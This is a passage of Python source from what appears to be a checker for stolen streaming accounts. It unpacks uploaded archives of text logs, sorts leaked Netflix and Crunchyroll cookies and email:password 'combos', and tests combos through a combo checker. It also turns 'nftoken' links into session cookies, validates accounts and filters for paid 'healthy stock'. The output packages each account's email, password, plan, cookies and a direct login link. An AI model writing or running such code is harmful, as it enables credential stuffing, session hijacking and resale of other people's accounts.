    if current_cookie_lines:
        items.append("\n".join(current_cookie_lines))

    return deduplicate_items(items)


def extract_text_files_from_archive(file_bytes: bytes, file_name: str) -> list[tuple[str, str]]:
    """
    Extracts all text files from compressed archives (.zip, .rar, .tar, .tar.gz, .tgz, .7z)
    Natively supports Windows tar.exe and zipfile.
    Returns list of tuples: (filename, text_content)
    """
    import os
    import io
    import zipfile
    import subprocess
    import tempfile

    file_name_lower = file_name.lower()
    results = []

    # 1. Native ZIP handling
    if file_name_lower.endswith(".zip"):
        try:
            with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
                for name in zf.namelist():
                    if name.endswith("/") or name.endswith("\\") or "__MACOSX" in name:
                        continue
                    if not name.lower().endswith(".txt"):
                        continue
                    safe_name = os.path.basename(name)
                    if not safe_name or safe_name.startswith("."):
                        continue
                    with zf.open(name) as f:
                        raw = f.read(50 * 1024 * 1024)
                        for enc in ["utf-8", "utf-16", "cp1252", "latin1"]:
                            try:
                                text = raw.decode(enc)
                                results.append((safe_name, text))
                                break
                            except UnicodeDecodeError:
                                pass
                        else:
                            results.append((safe_name, raw.decode("utf-8", errors="ignore")))
            return results
        except Exception as e:
            print(f"[DEBUG] Archive zip extraction warning: {e}")
            pass

    # 2. RAR, TAR, 7Z, GZ using system tar
    if file_name_lower.endswith((".rar", ".tar", ".tar.gz", ".tgz", ".7z", ".gz")):
        suffix = os.path.splitext(file_name_lower)[1]
        with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as tf:
            tf.write(file_bytes)
            tf_path = tf.name

        with tempfile.TemporaryDirectory() as td:
            try:
                subprocess.run(
                    ["tar", "-xf", tf_path, "-C", td],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                for root, dirs, files in os.walk(td):
                    for f in files:
                        if not f.lower().endswith(".txt") or f.startswith("."):
                            continue
                        full = os.path.join(root, f)
                        try:
                            raw = open(full, "rb").read(50 * 1024 * 1024)
                            for enc in ["utf-8", "utf-16", "cp1252", "latin1"]:
                                try:
                                    text = raw.decode(enc)
                                    results.append((f, text))
                                    break
                                except UnicodeDecodeError:
                                    pass
                            else:
                                results.append((f, raw.decode("utf-8", errors="ignore")))
                        except Exception:
                            pass
            except Exception:
                pass
            finally:
                if os.path.exists(tf_path):
                    try:
                        os.remove(tf_path)
                    except Exception:
                        pass
        return results

    return results


def analyze_and_categorize_items(items: list) -> dict:
    """
    Categorizes a list of items into detailed counts:
    - netflix_cookies: count (Netflix Cookies & full account HIT blocks)
    - crunchy_cookies: count
    - other_cookies: count
    - nf_tokens: count (pure Direct Watch / nftoken links)
    - combos: count (Email:Pass or User:Pass)
    - total: total count
    """
    res = {
        "netflix_cookies": 0,
        "crunchy_cookies": 0,
        "other_cookies": 0,
        "nf_tokens": 0,
        "combos": 0,
        "total": len(items),
    }

    for item in items:
        item_str = str(item).strip()
        if not item_str:
            continue
        lower_item = item_str.lower()
        lines = [line_str.strip() for line_str in item_str.splitlines() if line_str.strip()]

        # 1. Netflix Cookies or Full Hit Block (contains NetflixId or SecureNetflixId or Netscape cookie lines)
        if "netflixid" in lower_item or "securenetflixid" in lower_item or (".netflix.com" in lower_item and "\t" in item_str):
            res["netflix_cookies"] += 1
        elif "crunchyroll.com" in lower_item or "etp_rt" in lower_item:
            res["crunchy_cookies"] += 1
        elif "nftoken=" in lower_item or (lower_item.startswith(("http://", "https://")) and "netflix" in lower_item):
            res["nf_tokens"] += 1
        elif len(lines) == 1 and parse_combo_line(lines[0]):
            res["combos"] += 1
        else:
            res["other_cookies"] += 1

    return res


async def process_raw_item(raw_content: str) -> dict:
    """
    Takes raw text (either raw cookies or combo email:pass), extracts cookies,
    validates them, generates the direct login link, and extracts account info.
    Returns a dict with: {country, email, plan, payment, cookies, direct_link} or None.
    """
    raw_content = raw_content.strip()
    cookies = parse_netflix_cookies(raw_content)
    parsed_password = None

    # Check if raw_content contains an embedded email:pass combo
    import re
    embedded_combo_m = re.search(r"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[:;|\t]([^\s|;]+)", raw_content)
    if embedded_combo_m:
        cand_p = embedded_combo_m.group(2).strip()
        if not cand_p.startswith(("http://", "https://")):
            parsed_password = cand_p

    # If not valid cookies format, try to parse as combo or token
    if not cookies:
        if embedded_combo_m and parsed_password:
            email = embedded_combo_m.group(1).strip()
            cookies_list = await combo_checker.check_combo_async(email, parsed_password)
            if cookies_list:
                cookies = cookies_list
        elif "netflix.com" in raw_content and "nftoken=" in raw_content:
            url_match = re.search(r"(https://www\.netflix\.com/[^\s]+nftoken=[^\s]+)", raw_content)
            if url_match:
                token_url = url_match.group(1)
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    }
                    import aiohttp

                    async with (
                        aiohttp.ClientSession() as aio_session,
                        aio_session.get(token_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)),
                    ):
                        extracted_cookies = []
                        for c in aio_session.cookie_jar:
                            extracted_cookies.append(
                                {
                                    "name": c.key,
                                    "value": c.value,
                                    "domain": c["domain"],
                                    "path": c["path"],
                                    "secure": True,
                                    "httpOnly": True,
                                }
                            )

                        if any(c.get("name") == "NetflixId" for c in extracted_cookies):
                            cookies = extracted_cookies
                except Exception as e:
                    print(f"Error extracting cookies from token: {e}")

    if not cookies:
        return None

    try:
        # Step 1: PRIMARY VALIDATION - Check account details with Netflix
        account_info = await scraper.fetch_enhanced_account_details(cookies)
        if isinstance(account_info, dict) and account_info.get("error") == "rate_limit":
            return {"error": "rate_limit"}
        if not account_info or not isinstance(account_info, dict):
            return None
        # Reject accounts with removed payment, no payment, payment hold, or cancelled status
        if not is_healthy_stock(account_info):
            return None

        # Step 2: OPTIONAL ENHANCEMENT - Try to generate direct login link (nftoken)
        direct_link = "N/A"
        try:
            link = await scraper.generate_direct_login_link_api(cookies)
            if link and str(link).startswith("http"):
                direct_link = link
        except Exception:
            pass

        # Fallback to direct token link present in raw_content if API generation did not produce a link
        if direct_link == "N/A":
            token_url_match = re.search(
                r"(https?://[^\s]*netflix\.com/[^\s]*nftoken=[^\s]+|https?://[^\s]*nftoken=[^\s]+)", raw_content
            )
            if token_url_match:
                direct_link = token_url_match.group(1).strip()

        country = account_info.get("country", "Unknown")
        email = account_info.get("email", "Unknown")
        plan = account_info.get("plan", "Unknown")
        payment = account_info.get("package", "Unknown")

        # Fallback to email in raw_content if account_info returned Unknown
        if not email or email == "Unknown":
            em_match = re.search(
                r"(?:Email|loginId|Account):\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
                raw_content,
                re.IGNORECASE,
            )
            if em_match:
                email = em_match.group(1).strip()

        # Convert cookies back to Netscape string for storage
        cookie_lines = []
        for c in cookies:
            domain = c.get("domain", ".netflix.com")
            flag = "TRUE" if domain.startswith(".") else "FALSE"
            path = c.get("path", "/")
            secure = "TRUE" if c.get("secure", True) else "FALSE"
            exp_val = c.get("expirationDate") or c.get("expires") or 1788198674
            try:
                expiration = str(int(exp_val))
            except (ValueError, TypeError):
                expiration = "1788198674"
            name = c.get("name", "")
            value = c.get("value", "")
            cookie_lines.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}")
        cookies_str = "\n".join(cookie_lines)

        return {
            "country": country.strip(),
            "email": email.strip(),
            "plan": plan.strip(),
            "payment": payment.strip(),
            "cookies": cookies_str,
            "password": parsed_password,
            "direct_link": direct_link,
        }
    except Exception as e:
        print(f"Error processing item: {e}")
        return None
